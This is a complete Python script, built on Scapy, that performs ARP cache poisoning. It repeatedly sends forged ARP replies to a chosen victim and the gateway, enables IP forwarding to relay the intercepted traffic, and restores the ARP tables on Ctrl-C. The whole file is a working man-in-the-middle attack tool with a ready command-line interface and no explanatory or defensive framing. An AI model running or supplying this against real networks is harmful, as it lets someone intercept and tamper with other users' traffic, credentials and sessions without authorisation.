#!/usr/bin/env python3
import argparse
import signal
import sys
import time

import scapy.all as scapy


def get_mac(ip: str, iface: str = None) -> str:
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = broadcast / arp_request
    answered = scapy.srp(packet, timeout=2, retry=2, iface=iface, verbose=False)[0]
    if answered:
        return answered[0][1].hwsrc
    return None


def spoof(target_ip: str, spoof_ip: str, interface: str = None, attacker_mac: str = None) -> None:
    target_mac = get_mac(target_ip, iface=interface)
    if target_mac is None:
        print(f"[!] Could not resolve MAC for {target_ip}; skipping.")
        return
    if attacker_mac is None:
        attacker_mac = scapy.get_if_hwaddr(interface) if interface else scapy.get_if_hwaddr(scapy.conf.iface)
    ether = scapy.Ether(dst=target_mac, src=attacker_mac)
    arp = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=attacker_mac)
    packet = ether / arp
    scapy.sendp(packet, iface=interface, verbose=False)


def restore(destination_ip: str, source_ip: str, interface: str = None) -> None:
    dest_mac = get_mac(destination_ip, iface=interface)
    src_mac = get_mac(source_ip, iface=interface)
    if dest_mac and src_mac:
        ether = scapy.Ether(dst=dest_mac, src=src_mac)
        arp = scapy.ARP(op=2, pdst=destination_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=src_mac)
        packet = ether / arp
        scapy.sendp(packet, count=3, iface=interface, verbose=False)


def set_ip_forwarding(enable: bool) -> None:
    path = "/proc/sys/net/ipv4/ip_forward"
    try:
        with open(path, "w") as f:
            f.write("1" if enable else "0")
    except PermissionError:
        print("[!] Unable to set IP forwarding (permission denied). Run as root.")


def main() -> None:
    parser = argparse.ArgumentParser(description="ARP cache poisoning tool using Scapy.")
    parser.add_argument("victim_ip", help="IP address of the victim host")
    parser.add_argument("gateway_ip", help="IP address of the network gateway")
    parser.add_argument(
        "-i",
        "--interface",
        dest="iface",
        default=None,
        help="Network interface to send packets on (optional)",
    )
    parser.add_argument(
        "--no-forward",
        action="store_true",
        help="Disable IP forwarding (enabled by default)",
    )
    parser.add_argument(
        "-v",
        "--verbose",
        action="store_true",
        help="Print the number of packets sent while running",
    )
    args = parser.parse_args()

    victim_ip = args.victim_ip
    gateway_ip = args.gateway_ip

    set_ip_forwarding(not args.no_forward)

    def handle_interrupt(signum, frame):
        print("\n[!] Interrupt received. Restoring network…")
        restore(victim_ip, gateway_ip, args.iface)
        restore(gateway_ip, victim_ip, args.iface)
        set_ip_forwarding(False)
        sys.exit(0)

    signal.signal(signal.SIGINT, handle_interrupt)

    packet_count = 0
    attacker_mac = scapy.get_if_hwaddr(args.iface) if args.iface else scapy.get_if_hwaddr(scapy.conf.iface)
    try:
        while True:
            spoof(victim_ip, gateway_ip, args.iface, attacker_mac=attacker_mac)
            spoof(gateway_ip, victim_ip, args.iface, attacker_mac=attacker_mac)
            packet_count += 2
            if args.verbose:
                print(f"\r[+] Packets sent: {packet_count}", end="", flush=True)
            time.sleep(2)
    except KeyboardInterrupt:
        pass


if __name__ == "__main__":
    main()
